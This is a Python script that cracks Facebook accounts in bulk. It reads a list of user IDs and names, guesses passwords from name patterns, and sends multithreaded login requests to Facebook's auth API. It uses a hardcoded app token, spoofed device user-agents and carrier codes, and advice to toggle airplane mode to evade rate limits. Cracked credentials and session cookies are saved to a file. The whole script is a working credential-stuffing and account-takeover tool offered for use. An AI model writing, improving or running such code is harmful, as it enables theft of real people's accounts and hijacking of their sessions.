import os
import sys
import time
import uuid
import json
import random
import gzip
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import pycurl
except ModuleNotFoundError:
    os.system('pip install pycurl')

import pycurl
from io import BytesIO
os.system("xdg-open https://t.me/SUMON404_OFFICIAL")

class SUMON:
    def __init__(self):
        self.loop, self.ok, self.cp, self.plist = 0, [], [], []
        self.linexx = ("=" * 55)
        self.g = "\x1b[1;32m"
        self.r = "\x1b[1;31m"
        self.w = "\x1b[1;37m"
        self.logo = (f' dP""b8 88 888888 888888  || BY {self.g}SUMON{self.w}' + '\n' +
                     f'dP   `" 88 88__     88    || GitHub : {self.g}SUMON-404{self.w}' + '\n' +
                     f'Yb  "88 88 88""     88    || GIFTED{self.g} FOR 1K MEMBERS{self.w}' + '\n' +
                     f' YboodP 88 88       88    || TG : {self.g}@SUMON404_OFFICIAL{self.w}' + '\n' +
                     f'{self.linexx}')

    def linex(self):
        print("=" * 55)

    def clear(self):
        os.system('clear')
        print(self.logo)

    def __SUMON__(self):
        self.clear()
        print(' [1] FILE CLONE ')
        print(' [0] EXIT TOOL ')
        self.linex()
        choice = input('<!!> CHOICE : ')
        if choice == '1':
            os.system("xdg-open https://t.me/@Sumonroy1111")
            self.file()
        elif choice == '0':
            sys.exit()
        else:
            self.__SUMON__()

    def file(self):
        self.clear()
        print('<!!> /sdcard/SUMON.txt')
        self.linex()
        filename = input('<!!> FILE NAME : ')
        os.system("xdg-open https://t.me/@Sumonroy1111")
        try:
            with open(filename, 'r') as f:
                ids_list = f.read().splitlines()
        except FileNotFoundError:
            print('<!!> FILE NOT FOUND')
            time.sleep(1)
            self.file()
            return

        self.clear()
        limit = int(input('<!!> PASSWORD LIMIT : '))
        self.linex()
        print('<!!> EXAMPLE : first last | firstlast | first123')
        self.linex()
        for i in range(limit):
            password = input(f'<!!> PASSWORD NO {i + 1} : {self.g}')
            self.plist.append(password)
            self.linex()

        with ThreadPool(max_workers=30) as executor:
            total_ids = str(len(ids_list))
            self.clear()
            print(f'<!!> TOTAL ID {total_ids}')
            print('<!!> TURN [ON/OFF] AIRPLANE MODE EVERY 3 MIN')
            self.linex()
            for user in ids_list:
                ids, names = user.split('|')
                executor.submit(self.M1, ids, names, self.plist)

        print('\n' + "=" * 55)
        print(f'<!!> THE PROCESS HAS BEEN COMPLETED')
        print(f'<!!> TOTAL OK ID {len(self.ok)}')
        print(f'<!!> TOTAL CP ID {len(self.cp)}')
        print("=" * 55)
        input('<!!> PRESS ENTER TO BACK ')
        self.__SUMON__()

    def generate_fb_ads_user_agent(self):
    # List of common Android versions and build IDs
        android_versions = [
        ("13", "TQ3A.230901.001"),
        ("14", "UP1A.231105.001"),
        ("15", "AP1A.241205.007"),
        ("16", "BP2A.250305.031")
    ]
    
    # List of common devices [Manufacturer, Brand, Model]
        devices = [
        ("samsung", "samsung", "SM-S928B"), # S24 Ultra
        ("google", "google", "Pixel 9 Pro"),
        ("samsung", "samsung", "SM-G991U"),  # S21
        ("OnePlus", "OnePlus", "CPH2551")    # OnePlus Open
    ]

        ver, build = random.choice(android_versions)
        mf, br, dv = random.choice(devices)
    
    # Randomize minor version numbers for realism
        chrome_ver = f"1{random.randint(30, 45)}.0.{random.randint(5000, 7000)}.{random.randint(10, 150)}"
        fb_ver = f"{random.randint(500, 550)}.0.0.{random.randint(30, 60)}.{random.randint(10, 120)}"
        fbbv = random.randint(800000000, 900000000)

        ua = (
        f"Mozilla/5.0 (Linux; Android {ver}; {dv} Build/{build}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} Mobile Safari/537.36 "
        f"[FBAN/EMA;FBLC/en_US;FBAV/{fb_ver};FBBV/{fbbv};FBCR/Verizon;"
        f"FBMF/{mf};FBBD/{br};FBDV/{dv};FBSV/{ver};FBPN/com.facebook.adsmanager;]"
    )
        return ua
        
    def M1(self, ids, names, passwords):
        sys.stdout.write(f'\r\r{self.g}[SUMON-404]-[{self.loop}]-[OK:{len(self.ok)}]-[CP:{len(self.cp)}] ')
        sys.stdout.flush()

        try:
            first_name = names.split(' ')[0]
            last_name = names.split(' ')[1] if len(names.split(' ')) > 1 else first_name

            for __pas__ in passwords:
                passwd = (__pas__
                          .replace('first', first_name.lower())
                          .replace('First', first_name)
                          .replace('last', last_name.lower())
                          .replace('Last', last_name)
                          .replace('Name', names)
                          .replace('name', names.lower()))
                device_groups = ["5142", "3612", "2048", "1024"] 
                hni_codes = ["310260", "311390", "310410", "20801", "21401", "26201"]
                data = {'adid':str(uuid.uuid4()),
                    'email':ids,
                    'password':f'#PWD_FB4A:0:{int(time.time())}:{passwd}',
                    'cpl':'true',
                    'credentials_type':'device_based_login_password',
                    "source": "device_based_login",
                    'error_detail_type':'button_with_disabled',
                    'source':'login','format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1',
                    "locale":"es_CU","client_country_code":"CU",
                    'device':str(uuid.uuid4()),
                    'device_id':str(uuid.uuid4()),
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                headers = {
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-sim-hni':random.choice(hni_codes),
                    'x-fb-connection-type':'unknown',
                    'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'user-agent': {self.generate_fb_ads_user_agent()},
                    'x-fb-net-hni':random.choice(hni_codes),
                    'x-fb-connection-bandwidth':str(random.randint(200000,400000)),
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-friendly-name':'authenticate',
                    'accept-encoding':'gzip, deflate',
                    'x-fb-http-engine':     'Liger'}
                
                url = 'https://b-graph.facebook.com/auth/login'
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, url)
                c.setopt(c.HTTPHEADER, headers)
                c.setopt(c.WRITEDATA, buffer)
                data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
                c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
                c.perform()
                c.close()

                response_data = buffer.getvalue()

                try:
                    decompressed_data = gzip.decompress(response_data).decode('utf-8')
                except OSError:
                    decompressed_data = response_data.decode('utf-8')

                response = json.loads(decompressed_data)

                if 'access_token' in response:
                    print(f'\r\r{self.g}[SUMON-OK] {ids} | {passwd}')
                    cookies = ";".join(f"{c["name"]}={c["value"]}" for c in response["session_cookies"])
                    with open('/sdcard/SUMON-FILE-OK.txt', 'a') as f:
                        f.write(f'{ids}|{passwd}|{cookies}\n')
                    self.ok.append(ids)
                    break
                elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                    print(f'\r\r{self.r}[SUMON-CP] {ids} | {passwd}')
                    with open('/sdcard/SUMON-FILE-CP.txt', 'a') as f:
                        f.write(f'{ids}|{passwd}\n')
                else:
                    continue

            self.loop += 1

        except Exception as e:
            pass
    
    def __approval__(self):
        try:
            #ekhane tomar approval link deo
            urlx1 = ""
            appx_buffer = BytesIO()
            appx_curl = pycurl.Curl()
            appx_curl.setopt(pycurl.URL, urlx1)
            appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
            appx_curl.perform()
            appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
            raw = "".join(appx_data)
        except pycurl.error as e:
            exit("<!!> SOMETHING WENT WRONG...!")
        key1 = str(os.geteuid()).upper()
        keys = "X".join(key1)
        
        if keys in raw:
            tool = SUMON()
            tool.__SUMON__()
        else:
            self.clear()
            print("<!!> YOUR KEY IS NOT APPROVED...!")
            print("<!!> CONTACT ADMIN FOR APPROVAL...✅")
            print("<!!> YOUR KEY : "+ keys)
            self.linex()
            sys.exit()
if __name__ == '__main__':
    tool = SUMON()
    tool.__approval__()
